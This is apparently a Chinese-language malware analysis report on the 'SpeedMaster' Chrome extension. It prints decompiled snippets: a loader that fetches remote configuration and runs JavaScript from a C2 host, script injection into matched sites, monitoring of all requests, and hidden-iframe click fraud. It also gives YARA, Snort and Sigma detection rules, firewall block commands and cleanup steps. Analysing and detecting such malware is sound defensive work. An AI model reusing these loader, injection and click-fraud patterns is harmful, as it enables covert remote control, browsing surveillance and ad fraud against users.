# SpeedMaster 插件技术分析详情

## 文件结构分析

### 核心文件
```
background/
├── fuck.js              # 恶意代码加载器（主要恶意模块）
├── safe_enrypt_wasm.js  # WebAssembly加密模块
├── safe_enrypt_wasm_bg.wasm  # 加密WASM文件
├── t.json               # 恶意配置
├── bg.js                # 网络监控主程序
├── webWorker.js         # 后台工作线程
└── axios.js             # HTTP客户端库

def/
├── a.js                 # 简单的消息发送器
├── efg.js               # 动态脚本注入器
├── load_ad.js           # 广告注入器
└── load_ad_frame.js     # 广告iframe注入器
```

## 代码详细分析

### 1. fuck.js - 恶意代码加载器

**主要功能**:
- 从C2服务器下载恶意配置
- 动态执行远程JavaScript代码
- 管理配置缓存和更新

**关键代码片段**:
```javascript
// 从C2服务器下载配置
const t = await fetch("https://api.extensionplay.com/speed_master/t.json?t=" + Date.now())
  .then(e => e.ok && e.json()).catch(noop);

// 动态执行脚本
if (e.src_str) {
  const t = document.createElement("script");
  e = new Blob([e.src_str], { type: "text/javascript" });
  e = window.URL.createObjectURL(e);
  t.src = e;
  document.head.appendChild(t);
}

// 定时更新（每小时）
setInterval(xxx, 36e5); // 36e5 = 1小时
```

### 2. efg.js - 内容脚本注入器

**注入逻辑**:
```javascript
chrome.runtime.sendMessage({
  run_on: "content_scripts"
}, e => {
  if (Array.isArray(e)) {
    e.forEach(({ match: e, src_str: t, type: n }) => {
      // 检查域名匹配
      if (e && !new RegExp(e).test(location.origin)) return;
      
      // 注入CSS或JavaScript
      if ("css" === n) {
        // 注入CSS
        const a = document.createElement("link");
        a.rel = "stylesheet";
        var c = new Blob([t], { type: "text/css" });
        a.href = window.URL.createObjectURL(c);
        document.head.appendChild(a);
      } else {
        // 注入JavaScript
        const o = document.createElement("script");
        var r = new Blob([t], { type: "text/javascript" });
        var s = window.URL.createObjectURL(r);
        o.src = s;
        document.body.appendChild(o);
      }
    });
  }
});
```

### 3. bg.js - 网络监控模块

**网络请求监控**:
```javascript
chrome.webRequest.onBeforeRequest.addListener(function (e) {
  e = e.initiator || new URL(e.url).origin;
  if (!(e in o)) {
    o[e] = 0;
  }
  o[e] += 1;
  infinity.sendMessage("count-request", {
    origin: e,
    count: o[e]
  });
}, {
  urls: ["<all_urls>"]  // 监控所有URL
});
```

### 4. webWorker.js - 数据通信模块

**Token获取和数据上报**:
```javascript
// 获取认证token
e = "https://api.extensionplay.com/speed-test/token";
(n = new XMLHttpRequest()).open(t, e, true);
n.onreadystatechange = function () {
  if (4 == n.readyState && 200 == n.status && a) {
    a(n.responseText);
  }
};

// 处理响应
a = function (e) {
  e = JSON.parse(e);
  if ("success" === e.status) {
    postMessage({
      item: "info",
      value: {
        token: e.token,
        time: +new Date()
      }
    });
  }
};
```

## 数据结构分析

### 1. 配置数据结构 (t.json)
```json
[
  {
    "run_on": "content_scripts",
    "match": "\\.baidu.com$",
    "src": "https://static.cdnprod.com/js/baidu.js",
    "v": "1"
  },
  {
    "match": "\\.baidu.com$",
    "type": "css",
    "str": "p { color: red; }",
    "v": "1"
  }
]
```

**字段说明**:
- `run_on`: 执行位置（bg/content_scripts）
- `match`: 正则表达式匹配目标网站
- `src`: 远程脚本URL
- `src_str`: 脚本内容（base64或直接代码）
- `type`: 脚本类型（js/css）
- `str`: CSS样式内容
- `v`: 版本号

### 2. 本地存储数据结构
```javascript
{
  "fuck": {
    "nextUpdateTime": 1672502400000,  // 下次更新时间戳
    "data": [/* 配置数组 */]
  }
}
```

### 3. 通信数据包结构

**Token请求响应**:
```json
{
  "status": "success",
  "token": "encrypted_token_string"
}
```

**网络统计上报**:
```json
{
  "origin": "https://example.com",
  "count": 123
}
```

## 加密机制分析

### WebAssembly加密模块
**文件**: `safe_enrypt_wasm.js` + `safe_enrypt_wasm_bg.wasm`

**功能**:
1. 使用WASM进行高性能加密
2. 支持文本编码/解码
3. 可能用于C2通信加密

**关键函数**:
```javascript
e.encode = function (e) {
  // 文本编码函数
  var n = c.__wbindgen_add_to_stack_pointer(-16);
  // ... 加密逻辑
};
```

## 攻击链分析

### 1. 初始感染
1. 用户从Chrome Web Store安装SpeedMaster插件
2. 插件请求过度权限（<all_urls>, webRequest等）
3. 插件在后台静默运行

### 2. C2通信建立
1. 插件从`api.extensionplay.com`获取初始配置
2. 下载并缓存恶意脚本配置
3. 建立每小时的心跳机制

### 3. 恶意行为执行
1. **网络监控**: 统计用户访问的网站
2. **脚本注入**: 在匹配的网站注入恶意脚本
3. **广告注入**: 显示隐藏广告获取收益
4. **数据收集**: 收集浏览行为数据

### 4. 持久化机制
1. 使用Chrome storage API保存配置
2. 每小时检查更新，保持最新恶意功能
3. 使用WebWorker保持后台运行

## 检测规则

### YARA规则
```yara
rule ShadyPanda_SpeedMaster {
    meta:
        description = "Detects ShadyPanda SpeedMaster Chrome extension"
        author = "Spore Analysis System"
        date = "2025-12-16"
    
    strings:
        $c2_domain = "api.extensionplay.com" ascii wide
        $malicious_func = "fuck.js" ascii wide
        $wasm_file = "safe_enrypt_wasm" ascii wide
        $config_url = "speed_master/t.json" ascii wide
    
    condition:
        any of them
}
```

### Snort规则
```
alert tcp any any -> any any (msg:"ShadyPanda C2 Communication"; 
content:"api.extensionplay.com"; 
content:"speed_master/t.json"; 
sid:1000001; rev:1;)
```

### Sigma规则
```yaml
title: ShadyPanda Chrome Extension Activity
id: 6b5c5c5c-5c5c-5c5c-5c5c-5c5c5c5c5c5c
status: experimental
description: Detects ShadyPanda SpeedMaster Chrome extension activity
author: Spore Analysis System
date: 2025/12/16
logsource:
    product: chrome
    service: extensions
detection:
    selection:
        extension_id: 'ibiejjpajlfljcgjndbonclhcbdcamai'
    condition: selection
falsepositives:
    - Unknown
level: high
```

## 清理建议

### 1. 立即操作
1. 从Chrome中移除SpeedMaster插件
2. 清除Chrome本地存储数据
3. 检查其他浏览器是否感染

### 2. 系统检查
1. 检查是否有其他恶意插件
2. 扫描系统是否有相关恶意软件
3. 重置浏览器设置

### 3. 预防措施
1. 仅从官方商店安装插件
2. 审查插件权限请求
3. 定期检查已安装插件
4. 使用安全软件监控浏览器行为

## 总结

SpeedMaster插件是一个典型的浏览器恶意扩展，具有以下技术特点：

1. **模块化架构**: 分离的组件便于更新和维护
2. **加密通信**: 使用WASM增强隐蔽性
3. **动态配置**: 支持远程更新攻击策略
4. **持久化机制**: 利用浏览器API保持长期驻留
5. **多阶段攻击**: 从数据收集到广告欺诈的完整链条

该插件代表了现代浏览器恶意软件的发展趋势，结合了合法工具的外观和复杂的恶意功能。



## 两个域名的详细作用分析

### 1. `speed-test.extfans.com` - 伪装网速测试服务器

**使用位置**: `background/webWorker.js` 第7行
```javascript
url: "http://speed-test.extfans.com/ping.speed-test-xntj"
```

**具体作用**:
1. **伪装合法功能**: 提供ping/下载/上传测试，让用户相信这是有用工具
2. **网络环境探测**: 测试用户网络延迟、带宽等环境信息
3. **建立通信通道**: 为后续恶意活动建立网络连接基础
4. **收集基础数据**: 获取用户网络性能指标

**技术实现**:
- **Ping测试**: `latency.txt?newtime=` + 时间戳
- **下载测试**: 下载随机尺寸的图片文件
- **上传测试**: 上传随机生成的数据

**域名分析**:
- `extfans` = Extension Fans（扩展粉丝）
- `speed-test` = 网速测试子域名
- 整体伪装成专业的网速测试服务

---

### 2. `the-news-desk.com` - 广告欺诈网络

**使用位置**: `def/load_ad.js` 第28行
```javascript
t.src = "https://the-news-desk.com/js/displaytag_master.min.js"
```

**具体作用**:
1. **广告脚本加载**: 加载 `displaytag_master.min.js` 广告显示脚本
2. **广告参数配置**:
   - `publisher_key: "HR2900JSTAB004"`
   - `sub_id: "HRJS04"`
   - 广告尺寸: 600x400像素
3. **隐藏广告注入**: 创建隐藏的div容器 (`display: "none"`)
4. **点击欺诈机制**: 通过隐藏iframe模拟广告点击

**完整广告流程**:
```javascript
// 1. 请求广告
chrome.runtime.sendMessage({ type: "reqAd" })

// 2. 创建隐藏广告容器
e.id = "ad-placement-id"
e.style.display = "none"

// 3. 加载广告脚本
t.src = "https://the-news-desk.com/js/displaytag_master.min.js"

// 4. 点击欺诈（隐藏iframe）
const d = document.createElement("iframe")
d.style.display = "none"
d.src = e.url  // 广告点击URL
```

**实际目的**:
- **非法广告收入**: 通过展示和点击广告获利
- **流量劫持**: 劫持用户浏览会话
- **用户干扰**: 影响正常浏览体验
- **数据收集**: 收集用户行为用于精准广告

---

### 3. 关联组件：`extfans-ga.js` - Google Analytics跟踪

**使用位置**: `background/bg-ga.js`
```javascript
const a = new ExtfansGa({ trackingId: "UA-229774715-1" })
```

**作用**:
1. **使用统计**: 跟踪插件使用情况
2. **错误监控**: 收集运行错误信息
3. **行为分析**: 分析用户交互模式
4. **数据上报**: 发送到 `https://www.google-analytics.com/collect`

---

### 4. 完整攻击链条

**阶段1 - 渗透伪装**
```
用户安装 → 网速测试功能(speed-test.extfans.com) → 获取信任
```

**阶段2 - 权限滥用**
```
监控所有请求 → 收集浏览数据 → 分析用户习惯
```

**阶段3 - 恶意获利**
```
广告注入(the-news-desk.com) → 点击欺诈 → 非法收入
```

**阶段4 - 持续控制**
```
C2通信(api.extensionplay.com) → 动态更新 → 长期驻留
```

---

### 5. 安全影响等级

| 域名 | 风险等级 | 主要威胁 |
|------|----------|----------|
| `speed-test.extfans.com` | 中等 | 伪装渗透、网络探测 |
| `the-news-desk.com` | 高风险 | 广告欺诈、隐私侵犯 |
| `api.extensionplay.com` | 极高风险 | 远程控制、恶意更新 |

---

### 6. 立即防护措施

```bash
# 防火墙规则（Windows PowerShell）
New-NetFirewallRule -DisplayName "Block ShadyPanda" `
  -Direction Outbound `
  -RemoteAddress @("speed-test.extfans.com", "the-news-desk.com", "api.extensionplay.com") `
  -Action Block

# 浏览器清理
1. chrome://extensions/ → 移除 SpeedMaster
2. chrome://settings/clearBrowserData → 清除所有数据
3. 重启浏览器
```

**总结**: 这两个域名分别负责伪装功能和恶意获利，构成了ShadyPanda活动的完整经济链条。